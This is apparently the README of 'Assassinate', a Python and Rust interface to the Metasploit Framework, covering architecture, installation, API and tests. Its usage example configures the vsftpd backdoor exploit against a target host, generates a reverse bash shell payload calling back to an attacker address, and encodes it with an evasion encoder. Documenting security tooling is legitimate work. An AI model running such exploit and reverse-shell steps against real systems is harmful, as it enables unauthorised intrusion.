# Assassinate

[![Rust](https://img.shields.io/badge/rust-1.91+-FF8400)](https://www.rust-lang.org)
[![Python Version](https://img.shields.io/badge/python-3.10--3.13-FF8400)](https://www.python.org)
[![License](https://img.shields.io/badge/license-GPLv3-FF8400.svg)](https://github.com/ausmaster/assassinate/blob/main/LICENSE)
[![Tests](https://github.com/ausmaster/assassinate/actions/workflows/ci.yml/badge.svg)](https://github.com/ausmaster/assassinate/actions)
[![Discord](https://img.shields.io/discord/859164869970362439)](https://discord.com/invite/PZqkgxu5SA)

---

## 📚 Overview

**Assassinate** is a high-performance **Python interface** to the **Metasploit Framework** using an IPC-based architecture. Built with shared memory ring buffers and a Rust daemon that bridges to MSF via Ruby FFI, it provides native performance for security automation workflows.

### Key Features

- **Complete MSF Access**: Full Python API covering Framework, Modules, Sessions, Payloads, Database, Jobs, and Plugins
- **IPC Architecture**: Lock-free shared memory communication for minimal overhead
- **Async/Sync APIs**: Both `async/await` and synchronous interfaces
- **Production Ready**: 118 integration tests validating complete MSF functionality
- **Multi-Platform**: Validated on Debian, Kali, Parrot, Ubuntu, Fedora, and Arch Linux

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                  Python Application                         │
│              assassinate Python Package                     │
└────────────────────┬────────────────────────────────────────┘
                     │ Async IPC Client
                     │ (MessagePack over Shared Memory)
┌────────────────────▼────────────────────────────────────────┐
│              Shared Memory Ring Buffers                     │
│         (Lock-free SPSC, /dev/shm/)                         │
└────────────────────┬────────────────────────────────────────┘
                     │ Binary Protocol
┌────────────────────▼────────────────────────────────────────┐
│                  Rust Daemon                                │
│         IPC Server + Ruby FFI Bridge                        │
│    (rust/daemon + rust/bridge + rust/ipc)                  │
└────────────────────┬────────────────────────────────────────┘
                     │ Magnus Ruby Embed
┌────────────────────▼────────────────────────────────────────┐
│                Metasploit Framework                         │
│                  (Ruby VM)                                  │
└─────────────────────────────────────────────────────────────┘
```

### Components

- **Python IPC Client** (`assassinate/ipc/`) - Async client with MessagePack serialization
- **Shared Memory** (`assassinate/ipc/shm.py`) - Lock-free ring buffer interface
- **Rust IPC Library** (`rust/ipc/`) - Protocol and ring buffer implementation
- **Rust Daemon** (`rust/daemon/`) - IPC server handling Python→Ruby calls
- **Rust Bridge** (`rust/bridge/`) - Magnus-based Ruby FFI to MSF

---

## 📂 Project Structure

```plaintext
assassinate/
├── assassinate/              # Python package
│   ├── __init__.py
│   ├── bridge/              # High-level Python API
│   │   ├── core.py          # Framework, initialize()
│   │   ├── modules.py       # Module operations
│   │   ├── sessions.py      # Session management
│   │   ├── datastore.py     # DataStore operations
│   │   ├── payloads.py      # Payload generation
│   │   └── db.py            # Database operations
│   ├── ipc/                 # IPC client implementation
│   │   ├── client.py        # Async IPC client
│   │   ├── protocol.py      # MessagePack protocol
│   │   └── shm.py           # Shared memory interface
│   └── logging.py           # Structured logging
│
├── rust/                    # Rust components
│   ├── ipc/                 # IPC library
│   │   ├── src/
│   │   │   ├── protocol.rs  # MessagePack protocol
│   │   │   ├── ring_buffer.rs  # Lock-free SPSC buffer
│   │   │   └── shm.rs       # Shared memory management
│   │   └── Cargo.toml
│   ├── bridge/              # Ruby FFI bridge
│   │   ├── src/
│   │   │   ├── framework.rs # MSF Framework interface
│   │   │   ├── ruby_bridge.rs  # Magnus Ruby VM
│   │   │   └── error.rs     # Error handling
│   │   └── Cargo.toml
│   └── daemon/              # IPC daemon
│       ├── src/
│       │   └── main.rs      # Daemon server
│       └── Cargo.toml
│
├── tests/                   # Integration tests (118 tests)
│   ├── conftest.py          # Pytest fixtures
│   ├── test_framework_detailed.py
│   ├── test_module_detailed.py
│   ├── test_datastore.py
│   ├── test_payloads.py
│   ├── test_db.py
│   ├── test_jobs.py
│   ├── test_plugins.py
│   └── test_sessions.py
│
├── .github/workflows/       # CI/CD pipelines
│   ├── ci.yml              # Main CI (Rust + Python tests)
│   └── distro-matrix.yml   # Multi-distro validation
│
├── TESTING_GUIDE.md        # Complete testing documentation
├── pyproject.toml          # Python project config
└── README.md               # This file
```

---

## 📥 Installation

### Prerequisites

- **Python**: 3.10-3.13 with `uv` package manager
- **Rust**: 1.91+ (for building daemon)
- **Ruby**: 3.1+ (system Ruby)
- **Metasploit Framework**: 6.4+
- **PostgreSQL**: For full MSF functionality

### Quick Start

#### 1. Install System Dependencies

**Debian/Ubuntu/Kali/Parrot:**
```bash
sudo apt-get update && sudo apt-get install -y \
  build-essential curl git \
  ruby-full ruby-dev \
  postgresql postgresql-contrib libpq-dev \
  libssl-dev pkg-config libclang-dev
```

**Fedora:**
```bash
sudo dnf install -y gcc gcc-c++ make curl git \
  ruby ruby-devel \
  postgresql postgresql-server postgresql-devel \
  openssl-devel clang-devel
```

**Arch Linux:**
```bash
sudo pacman -Syu --needed base-devel curl git \
  ruby postgresql clang openssl
```

#### 2. Install Metasploit Framework

**Kali/Parrot** (use package manager):
```bash
sudo apt-get install metasploit-framework
export MSF_ROOT=/usr/share/metasploit-framework
```

**Other distros** (clone from GitHub):
```bash
git clone --depth 1 https://github.com/rapid7/metasploit-framework.git ~/metasploit-framework
cd ~/metasploit-framework
gem install bundler
bundle install --jobs 4
export MSF_ROOT=$HOME/metasploit-framework
```

#### 3. Install Rust & Build Daemon

```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# Clone repository
git clone https://github.com/ausmaster/assassinate.git
cd assassinate

# Build all Rust components
cd rust/ipc && cargo build --release
cd ../bridge && cargo build --release
cd ../daemon && cargo build --release
```

#### 4. Install Python Package

```bash
# Install uv package manager
curl -LsSf https://astral.sh/uv/install.sh | sh

# Install assassinate
cd /path/to/assassinate
uv sync
```

#### 5. Start Daemon

```bash
# Start the daemon (required for Python client)
./rust/daemon/target/release/daemon --msf-root $MSF_ROOT &

# Daemon runs in background, Python clients connect via shared memory
```

---

## 📖 Usage

### Python API

```python
from assassinate import initialize, Framework

# Initialize connection to daemon
initialize()

# Create framework instance
fw = Framework()

# Get MSF version
print(fw.version())

# List modules
exploits = fw.list_modules("exploit")
print(f"Available exploits: {len(exploits)}")

# Create and configure a module
mod = fw.create_module("exploit/unix/ftp/vsftpd_234_backdoor")
mod.set_option("RHOSTS", "192.168.1.100")

# Validate options
if mod.validate():
    print("Module ready to run!")

# Generate a payload
pg = fw.payloads()
raw_payload = pg.generate_raw("cmd/unix/reverse_bash", {
    "LHOST": "192.168.1.5",
    "LPORT": "4444"
})

# Encode payload
encoded = pg.encode(raw_payload, "x86/shikata_ga_nai")

# Access database
db = fw.db()
db.report_host(host="192.168.1.100", os_name="Linux")

# List sessions
sessions = fw.sessions()
session_ids = sessions.list()
```

### Async API

```python
from assassinate import initialize_async, Framework
import asyncio

async def main():
    # Initialize async connection
    await initialize_async()

    fw = Framework()

    # All operations support async
    version = await fw.version_async()
    exploits = await fw.list_modules_async("exploit")

    mod = await fw.create_module_async("exploit/unix/ftp/vsftpd_234_backdoor")
    await mod.set_option_async("RHOSTS", "192.168.1.100")

asyncio.run(main())
```

### API Reference

**Framework Management:**
- `initialize()` / `initialize_async()` - Connect to daemon
- `Framework()` - Main framework instance
- `version()` - Get MSF version
- `list_modules(type)` - List modules by type

**Module Operations:**
- `create_module(name)` - Create module instance
- `set_option(key, value)` - Set module option
- `get_option(key)` - Get option value
- `validate()` - Validate configuration
- `check()` - Check if target is vulnerable

**Payload Generation:**
- `generate_raw(name, opts)` - Generate raw payload
- `generate_exe(name, opts, format)` - Generate executable
- `encode(data, encoder)` - Encode payload

**Session Management:**
- `sessions().list()` - List active sessions
- `sessions().get(id)` - Get session by ID
- `sessions().stop(id)` - Stop session

**Database Operations:**
- `db().report_host(...)` - Report host
- `db().report_service(...)` - Report service
- `db().report_vuln(...)` - Report vulnerability
- `db().report_cred(...)` - Store credential

See `help(assassinate)` for complete API documentation.

---

## ✅ Testing

### Test Suite (118 Tests)

```bash
# Run all tests
uv run pytest tests/ -v

# Run specific test module
uv run pytest tests/test_framework_detailed.py -v

# Run with debug logging
ASSASSINATE_LOG_LEVEL=DEBUG uv run pytest tests/ -v
```

### Docker Testing

```bash
# Run tests in Docker (clean environment)
./scripts/test-with-docker.sh

# Rebuild from scratch
./scripts/test-with-docker.sh --rebuild

# Verbose output
./scripts/test-with-docker.sh --verbose
```

### Local CI Validation

```bash
# Run same checks as CI
./.github/scripts/test-ci-locally.sh
```

See [TESTING_GUIDE.md](TESTING_GUIDE.md) for comprehensive testing documentation.

---

## 🚀 CI/CD

### Workflows

**Main CI** (`ci.yml`):
- Rust format & lint (all components)
- Python format & lint
- Build all Rust components
- Run Rust unit tests
- Run Python integration tests (118 tests)

**Multi-Distro** (`distro-matrix.yml`):
- Ubuntu 24.04 Full Test
- Kali Linux (package MSF)
- Parrot Security (package MSF)
- Debian, Ubuntu, Fedora, Arch (GitHub MSF)

All tests run on every PR. See [.github/CI_README.md](.github/CI_README.md) for details.

---

## 🔧 Development

### Code Quality

```bash
# Python formatting
uv run ruff format .

# Python linting
uv run ruff check .

# Python type checking
uv run mypy assassinate

# Rust formatting
cd rust/bridge && cargo fmt
cd rust/ipc && cargo fmt
cd rust/daemon && cargo fmt

# Rust linting
cd rust/bridge && cargo clippy -- -D warnings
```

### Building

```bash
# Build all Rust components
cd rust/ipc && cargo build --release
cd ../bridge && cargo build --release
cd ../daemon && cargo build --release

# Daemon will be at: rust/daemon/target/release/daemon
```

---

## 📜 License

This project is licensed under the **GNU General Public License v3.0 (GPL-3.0)**.

---

## 🗨️ Support

- **Issues**: [GitHub Issues](https://github.com/ausmaster/assassinate/issues)
- **Discord**: [Join our community](https://discord.com/invite/PZqkgxu5SA)
- **Documentation**: See [TESTING_GUIDE.md](TESTING_GUIDE.md)

---

## 🎯 Roadmap

- [x] Complete Python IPC interface
- [x] Comprehensive CI/CD across 6 distros
- [x] 118 integration tests
- [x] Docker testing environment
- [x] Structured logging
- [ ] BBOT integration module
- [ ] Performance benchmarking
- [ ] Extended platform support (macOS, Windows)
- [ ] API documentation site

---

## 🙏 Acknowledgments

- **Metasploit Framework** - For the incredible penetration testing platform
- **Magnus** - For excellent Ruby FFI library
- **Rust Community** - For amazing tooling and ecosystem
